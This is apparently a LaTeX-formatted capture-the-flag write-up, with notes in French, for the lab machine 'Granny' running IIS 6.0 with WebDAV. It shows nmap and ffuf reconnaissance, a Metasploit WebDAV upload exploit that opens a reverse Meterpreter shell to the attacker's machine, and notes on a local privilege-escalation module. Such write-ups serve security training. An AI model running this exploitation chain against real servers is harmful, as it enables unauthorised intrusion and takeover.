\chapter{Granny}
\begin{itemize}
    \item {\bf technics}: 
    \item {\bf Components}: WebDav
    \item {\bf tools}: 
\end{itemize}


\section{Résumé}


\section{Details}

\subsection{Recon}
\subsubsection{nmap}
\begin{verbatim}
 sudo nmap -sV -sC -oX nmap.xml 10.10.10.15
Starting Nmap 7.92 ( https://nmap.org ) at 2022-10-01 16:38 CEST
Nmap scan report for 10.10.10.15
Host is up (0.028s latency).
Not shown: 999 filtered tcp ports (no-response)
PORT   STATE SERVICE VERSION
80/tcp open  http    Microsoft IIS httpd 6.0
|_http-server-header: Microsoft-IIS/6.0
| http-webdav-scan:
|   Allowed Methods: OPTIONS, TRACE, GET, HEAD, DELETE, COPY, MOVE, PROPFIND, PROPPATCH, SEARCH, MKCOL, LOCK, UNLOCK
|   WebDAV type: Unknown
|   Server Date: Sat, 01 Oct 2022 14:38:56 GMT
|   Server Type: Microsoft-IIS/6.0
|_  Public Options: OPTIONS, TRACE, GET, HEAD, DELETE, PUT, POST, COPY, MOVE, MKCOL, PROPFIND, PROPPATCH, LOCK, UNLOCK, SEARCH
|_http-title: Under Construction
| http-methods:
|_  Potentially risky methods: TRACE DELETE COPY MOVE PROPFIND PROPPATCH SEARCH MKCOL LOCK UNLOCK PUT
Service Info: OS: Windows; CPE: cpe:/o:microsoft:windows
\end{verbatim}

\subsubsection{http}

la plupart des ffuf ne passent pas par contre
\begin{verbatim}
$ curl -I -X GET http://10.10.10.15
HTTP/1.1 200 OK
Content-Length: 1433
Content-Type: text/html
Content-Location: http://10.10.10.15/iisstart.htm
Last-Modified: Fri, 21 Feb 2003 15:48:30 GMT
Accept-Ranges: bytes
ETag: "05b3daec0d9c21:38e"
Server: Microsoft-IIS/6.0
MicrosoftOfficeWebServer: 5.0_Pub
X-Powered-By: ASP.NET
Date: Sat, 01 Oct 2022 15:25:12 GMT
\end{verbatim}

\begin{verbatim}
$ ffuf -u http://10.10.10.15/FUZZ -w /usr/share/wordlists/seclists/Discovery/Web-Content/IIS.fuzz.txt

/_private               [Status: 301, Size: 153, Words: 9, Lines: 2, Duration: 28ms]
/postinfo.html          [Status: 200, Size: 2440, Words: 327, Lines: 58, Duration: 28ms]
/_vti_bin/              [Status: 200, Size: 759, Words: 112, Lines: 3, Duration: 28ms]
/_vti_bin/shtml.dll     [Status: 401, Size: 579, Words: 67, Lines: 13, Duration: 38ms]
/_vti_bin/shtml.dll/asdfghjkl [Status: 401, Size: 579, Words: 67, Lines: 13, Duration: 41ms]
/_vti_bin/shtml.exe/qwertyuiop [Status: 401, Size: 579, Words: 67, Lines: 13, Duration: 43ms]
/_vti_bin/fpcount.exe?Page=default.asp|Image=3 [Status: 200, Size: 131, Words: 1, Lines: 2, Duration: 48ms]

\end{verbatim}


fpcount produit une page. fpcount.exe' CGI on the remote web server. Some
versions of this CGI have a remote buffer overflow vulnerability. A remote
attacker could exploit it to crash the web server, or possibly execute
arbitrary code.

\begin{verbatim}
$ sudo nmap -sV --script vuln -p80 10.10.10.15
Starting Nmap 7.92 ( https://nmap.org ) at 2022-10-01 17:58 CEST
Nmap scan report for 10.10.10.15
Host is up (0.026s latency).

PORT   STATE SERVICE VERSION
80/tcp open  http    Microsoft IIS httpd 6.0
| vulners:
|   cpe:/a:microsoft:internet_information_server:6.0:
|       SSV:2903        10.0    https://vulners.com/seebug/SSV:2903     *EXPLOIT*
|       PACKETSTORM:82956       10.0    https://vulners.com/packetstorm/PACKETSTORM:82956       *EXPLOIT*
|       MS01_033        10.0    https://vulners.com/canvas/MS01_033     *EXPLOIT*
|       CVE-2008-0075   10.0    https://vulners.com/cve/CVE-2008-0075
|       CVE-2001-0500   10.0    https://vulners.com/cve/CVE-2001-0500
|       SSV:30067       7.5     https://vulners.com/seebug/SSV:30067    *EXPLOIT*
|       CVE-2007-2897   7.5     https://vulners.com/cve/CVE-2007-2897
|       SSV:2902        7.2     https://vulners.com/seebug/SSV:2902     *EXPLOIT*
|       CVE-2008-0074   7.2     https://vulners.com/cve/CVE-2008-0074
|       CVE-2006-0026   6.5     https://vulners.com/cve/CVE-2006-0026
|       VERACODE:21774  5.0     https://vulners.com/veracode/VERACODE:21774
|       CVE-2005-2678   5.0     https://vulners.com/cve/CVE-2005-2678
|       CVE-2003-0718   5.0     https://vulners.com/cve/CVE-2003-0718
|       VERACODE:20937  4.3     https://vulners.com/veracode/VERACODE:20937
|       SSV:20121       4.3     https://vulners.com/seebug/SSV:20121    *EXPLOIT*
|       CVE-2010-1899   4.3     https://vulners.com/cve/CVE-2010-1899
|       CVE-2005-2089   4.3     https://vulners.com/cve/CVE-2005-2089
|       VERACODE:31557  4.0     https://vulners.com/veracode/VERACODE:31557
|       VERACODE:27647  3.5     https://vulners.com/veracode/VERACODE:27647
|_      CVE-2003-1582   2.6     https://vulners.com/cve/CVE-2003-1582
|_http-server-header: Microsoft-IIS/6.0
| http-frontpage-login:
|   VULNERABLE:
|   Frontpage extension anonymous login
|     State: VULNERABLE
|       Default installations of older versions of frontpage extensions allow anonymous logins which can lead to server compromise.
|
|     References:
|_      http://insecure.org/sploits/Microsoft.frontpage.insecurities.html
|_http-csrf: Couldn't find any CSRF vulnerabilities.
|_http-dombased-xss: Couldn't find any DOM based XSS.
|_http-stored-xss: Couldn't find any stored XSS vulnerabilities.
| http-enum:
|   /_vti_bin/: Frontpage file or folder
|   /postinfo.html: Frontpage file or folder
|   /_vti_bin/_vti_aut/author.dll: Frontpage file or folder
|   /_vti_bin/_vti_aut/author.exe: Frontpage file or folder
|   /_vti_bin/_vti_adm/admin.dll: Frontpage file or folder
|   /_vti_bin/_vti_adm/admin.exe: Frontpage file or folder
|   /_vti_bin/fpcount.exe?Page=default.asp|Image=3: Frontpage file or folder
|   /images/: Potentially interesting folder
|_  /_private/: Potentially interesting folder
Service Info: OS: Windows; CPE: cpe:/o:microsoft:windows

\end{verbatim}

le truc que j'ai loupé c'est tout simplement que l'on a du WebDAV.

donc assez simple avec metasploit.
\begin{verbatim}
msf6 exploit(windows/iis/iis_webdav_upload_asp) > run

[*] Started reverse TCP handler on 10.10.16.3:4444
[*] Checking /metasploit18548431.asp
[*] Uploading 609636 bytes to /metasploit18548431.txt...
[*] Moving /metasploit18548431.txt to /metasploit18548431.asp...
[*] Executing /metasploit18548431.asp...
[*] Deleting /metasploit18548431.asp (this doesn't always work)...
[*] Sending stage (175686 bytes) to 10.10.10.15
[!] Deletion failed on /metasploit18548431.asp [403 Forbidden]
[*] Meterpreter session 1 opened (10.10.16.3:4444 -> 10.10.10.15:1029) at 2022-10-02 02:51:05 +0200

/opt/metasploit/vendor/bundle/ruby/3.0.0/gems/pry-0.13.1/lib/pry/cli.rb:8: warning: already initialized constant Pry::CLI::NoOptionsError
/opt/metasploit/vendor/bundle/ruby/3.0.0/gems/pry-0.13.1/lib/pry/cli.rb:8: warning: previous definition of NoOptionsError was here
meterpreter >
\end{verbatim}


\subsection{Foothold}

\subsubsection{Discovery}
\begin{verbatim}
c:\windows\system32\inetsrv>whoami /priv
whoami /priv

PRIVILEGES INFORMATION
----------------------

Privilege Name                Description                               State
============================= ========================================= ========
SeAuditPrivilege              Generate security audits                  Disabled
SeIncreaseQuotaPrivilege      Adjust memory quotas for a process        Disabled
SeAssignPrimaryTokenPrivilege Replace a process level token             Disabled
SeChangeNotifyPrivilege       Bypass traverse checking                  Enabled
SeImpersonatePrivilege        Impersonate a client after authentication Enabled
SeCreateGlobalPrivilege       Create global objects                     Enabled
\end{verbatim}

\begin{verbatim}
msf6 post(multi/recon/local_exploit_suggester)
\end{verbatim}
utilisation de  \verb+windows/local/ms15_051_client_copy_image+

\section{Theorie}


